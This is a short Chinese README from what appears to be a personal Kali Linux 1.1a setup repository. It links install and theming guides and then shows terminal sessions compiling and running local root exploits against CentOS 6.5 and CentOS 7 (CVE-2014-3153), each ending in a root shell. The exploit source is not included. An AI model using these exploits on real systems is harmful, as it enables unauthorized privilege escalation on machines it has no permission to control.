# 操作系统安装与配置

### Kali1.1a 操作系统配置

#### Contents

- [Install Kali](Kali1.1a/Install-kali.md) - 安装Kali系统
- [Configure Kali Apt Sources](Kali1.1a/Configure-Apt-sources.md) - 配置Kali Apt源
- [Install mate desktop to kali](Kali1.1a/Install-Mate-disktop.md) - 安装mate桌面系统
- [Install Mint Themes to Kali](Kali1.1a/Install-Mint-Themes.md) - 安装mint桌面主题

#### 自动安装脚本
自动安装工具[脚本](Kali1.1a/autogen.sh)不包含安装显卡驱动，显卡需要根据自己的情况去安装。
```sh
root@Hack:~/ # chmod +x autogen.sh && ./autogen.sh 
```

#### CentOs6.5 local exploit
```sh
rush.q6e@Hack:~/ # gcc -O2 centos6.5.c
rush.q6e@Hack:~/ # ./a.out
2.6.37-3.x x86_64
sd@fucksheep.org 2010
-sh-4.1# id
uid=0(root) gid=0(root) 组=0(root),
```

#### CentOs7  local exploit
```sh
rush.q6e@Hack:~/ # gcc -o exp centos7.c -lpthread
rush.q6e@Hack:~/ # ./exp
CVE-2014-3153 exploit by Chen Kaiqu(kaiquchen@163.com)
Press RETURN after one second...
Checking whether exploitable..OK
Seaching good magic...
magic1=0xffff88001d06fc70 magic2=0xffff880004891c80
magic1=0xffff88002c8f5c70 magic2=0xffff88003cb59c80
Good magic found
Hacking...
ABRT has detected 1 problem(s). For more info run: abrt-cli list --since 1434357615
[root@Hack ~]#

```
